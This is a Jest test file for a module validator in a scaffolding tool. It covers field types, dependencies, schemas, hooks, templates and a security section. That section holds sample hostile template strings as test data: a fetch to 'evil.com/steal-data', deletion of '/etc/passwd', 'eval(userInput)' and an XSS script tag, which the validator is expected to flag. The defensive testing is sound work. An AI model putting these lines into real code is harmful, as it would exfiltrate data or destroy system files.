/**
 * Tests for ModuleValidator
 */
import { ModuleValidator } from '../../lib/modules/validation/module-validator.js';
import { getMockModule } from '../utils/mock-modules.js';

describe('ModuleValidator', () => {
  let validator;
  
  beforeEach(() => {
    validator = new ModuleValidator();
  });
  
  describe('Basic Module Validation', () => {
    test('should validate correct module', async () => {
      const module = getMockModule('vue-base');
      
      const result = await validator.validate(module);
      
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
    
    test('should detect missing required fields', async () => {
      const invalidModule = {
        name: 'incomplete-module'
        // Missing version, category, description
      };
      
      const result = await validator.validate(invalidModule);
      
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors.some(e => e.includes('version'))).toBe(true);
      expect(result.errors.some(e => e.includes('category'))).toBe(true);
      expect(result.errors.some(e => e.includes('description'))).toBe(true);
    });
    
    test('should validate field types', async () => {
      const invalidModule = {
        name: 123, // Should be string
        version: '1.0.0',
        category: 'frontend-framework',
        description: 'Test module',
        priority: 'high', // Should be number
        tags: 'tag1,tag2', // Should be array
        recommended: 'yes' // Should be boolean
      };
      
      const result = await validator.validate(invalidModule);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('name'))).toBe(true);
      expect(result.errors.some(e => e.includes('priority'))).toBe(true);
      expect(result.errors.some(e => e.includes('tags'))).toBe(true);
      expect(result.errors.some(e => e.includes('recommended'))).toBe(true);
    });
    
    test('should validate category values', async () => {
      const invalidModule = {
        name: 'invalid-category-module',
        version: '1.0.0',
        category: 'invalid-category',
        description: 'Test module'
      };
      
      const result = await validator.validate(invalidModule);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('category'))).toBe(true);
    });
    
    test('should validate version format', async () => {
      const invalidModule = {
        name: 'invalid-version-module',
        version: 'not-a-version',
        category: 'other',
        description: 'Test module'
      };
      
      const result = await validator.validate(invalidModule);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('version'))).toBe(true);
    });
  });
  
  describe('Dependency Validation', () => {
    test('should validate dependency format', async () => {
      const module = {
        name: 'dep-test-module',
        version: '1.0.0',
        category: 'other',
        description: 'Test module',
        dependencies: {
          'vue': '^3.0.0',
          'invalid-dep': 'not-a-version'
        }
      };
      
      const result = await validator.validate(module);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('dependency') && e.includes('invalid-dep'))).toBe(true);
    });
    
    test('should validate requires array', async () => {
      const module = {
        name: 'requires-test-module',
        version: '1.0.0',
        category: 'other',
        description: 'Test module',
        requires: 'not-an-array'
      };
      
      const result = await validator.validate(module);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('requires'))).toBe(true);
    });
    
    test('should validate provides array', async () => {
      const module = {
        name: 'provides-test-module',
        version: '1.0.0',
        category: 'other',
        description: 'Test module',
        provides: { invalid: 'object' }
      };
      
      const result = await validator.validate(module);
      
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('provides'))).toBe(true);
    });
  });
  
  describe('Method Validation', () => {
    test('should check for required methods', async () => {
      const moduleWithoutMethods = {
        name: 'no-methods-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module without required methods'
        // Missing getFileTemplates and getConfigSchema methods
      };
      
      const result = await validator.validate(moduleWithoutMethods);
      
      expect(result.warnings.some(w => w.includes('getFileTemplates'))).toBe(true);
      expect(result.warnings.some(w => w.includes('getConfigSchema'))).toBe(true);
    });
    
    test('should validate method signatures', async () => {
      const moduleWithInvalidMethods = {
        name: 'invalid-methods-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with invalid methods',
        getFileTemplates: 'not-a-function',
        getConfigSchema: 42
      };
      
      const result = await validator.validate(moduleWithInvalidMethods);
      
      expect(result.errors.some(e => e.includes('getFileTemplates'))).toBe(true);
      expect(result.errors.some(e => e.includes('getConfigSchema'))).toBe(true);
    });
  });
  
  describe('Security Validation', () => {
    test('should detect dangerous patterns in templates', async () => {
      const maliciousModule = {
        name: 'malicious-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with dangerous patterns',
        getFileTemplates: () => ({
          'malicious.js': {
            content: 'eval(userInput); // Dangerous!',
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(maliciousModule);
      
      expect(result.warnings.some(w => w.includes('eval'))).toBe(true);
    });
    
    test('should detect suspicious file operations', async () => {
      const suspiciousModule = {
        name: 'suspicious-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with suspicious file operations',
        getFileTemplates: () => ({
          'suspicious.js': {
            content: 'fs.unlinkSync("/etc/passwd"); // Suspicious!',
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(suspiciousModule);
      
      expect(result.warnings.some(w => w.includes('file operation'))).toBe(true);
    });
    
    test('should detect network operations', async () => {
      const networkModule = {
        name: 'network-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with network operations',
        getFileTemplates: () => ({
          'network.js': {
            content: 'fetch("http://evil.com/steal-data");',
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(networkModule);
      
      expect(result.warnings.some(w => w.includes('network'))).toBe(true);
    });
    
    test('should check for script injections', async () => {
      const scriptInjectionModule = {
        name: 'script-injection-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with script injection',
        getFileTemplates: () => ({
          'injection.html': {
            content: '<script>alert("XSS")</script>',
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(scriptInjectionModule);
      
      expect(result.warnings.some(w => w.includes('script'))).toBe(true);
    });
  });
  
  describe('Configuration Schema Validation', () => {
    test('should validate JSON schema format', async () => {
      const moduleWithInvalidSchema = {
        name: 'invalid-schema-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with invalid schema',
        getConfigSchema: () => ({
          // Invalid JSON schema
          type: 'invalid-type',
          properties: 'not-an-object'
        })
      };
      
      const result = await validator.validate(moduleWithInvalidSchema);
      
      expect(result.errors.some(e => e.includes('schema'))).toBe(true);
    });
    
    test('should accept valid JSON schema', async () => {
      const moduleWithValidSchema = {
        name: 'valid-schema-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with valid schema',
        getConfigSchema: () => ({
          type: 'object',
          properties: {
            apiKey: {
              type: 'string',
              description: 'API key for the service'
            },
            timeout: {
              type: 'number',
              minimum: 0,
              default: 5000
            }
          },
          required: ['apiKey']
        })
      };
      
      const result = await validator.validate(moduleWithValidSchema);
      
      expect(result.valid).toBe(true);
    });
  });
  
  describe('Template Validation', () => {
    test('should validate template merge strategies', async () => {
      const moduleWithInvalidMerge = {
        name: 'invalid-merge-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with invalid merge strategy',
        getFileTemplates: () => ({
          'test.js': {
            content: 'test',
            merge: 'invalid-strategy'
          }
        })
      };
      
      const result = await validator.validate(moduleWithInvalidMerge);
      
      expect(result.errors.some(e => e.includes('merge strategy'))).toBe(true);
    });
    
    test('should validate template structure', async () => {
      const moduleWithInvalidTemplate = {
        name: 'invalid-template-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with invalid template',
        getFileTemplates: () => ({
          'test.js': {
            // Missing content or src
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(moduleWithInvalidTemplate);
      
      expect(result.errors.some(e => e.includes('template'))).toBe(true);
    });
  });
  
  describe('Hook Validation', () => {
    test('should validate hook methods', async () => {
      const moduleWithInvalidHooks = {
        name: 'invalid-hooks-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with invalid hooks',
        hooks: {
          beforeInstall: 'not-a-function',
          invalidHook: () => {}
        }
      };
      
      const result = await validator.validate(moduleWithInvalidHooks);
      
      expect(result.errors.some(e => e.includes('hook'))).toBe(true);
    });
    
    test('should accept valid hooks', async () => {
      const moduleWithValidHooks = {
        name: 'valid-hooks-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with valid hooks',
        hooks: {
          beforeInstall: async (context) => context,
          afterInstall: async (context) => context
        }
      };
      
      const result = await validator.validate(moduleWithValidHooks);
      
      expect(result.valid).toBe(true);
    });
  });
  
  describe('Performance Validation', () => {
    test('should warn about large templates', async () => {
      const moduleWithLargeTemplate = {
        name: 'large-template-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with large template',
        getFileTemplates: () => ({
          'large.js': {
            content: 'a'.repeat(100000), // 100KB template
            merge: 'replace'
          }
        })
      };
      
      const result = await validator.validate(moduleWithLargeTemplate);
      
      expect(result.warnings.some(w => w.includes('large'))).toBe(true);
    });
    
    test('should warn about too many templates', async () => {
      const templates = {};
      for (let i = 0; i < 1000; i++) {
        templates[`file${i}.js`] = {
          content: `// File ${i}`,
          merge: 'replace'
        };
      }
      
      const moduleWithManyTemplates = {
        name: 'many-templates-module',
        version: '1.0.0',
        category: 'other',
        description: 'Module with too many templates',
        getFileTemplates: () => templates
      };
      
      const result = await validator.validate(moduleWithManyTemplates);
      
      expect(result.warnings.some(w => w.includes('templates'))).toBe(true);
    });
  });
});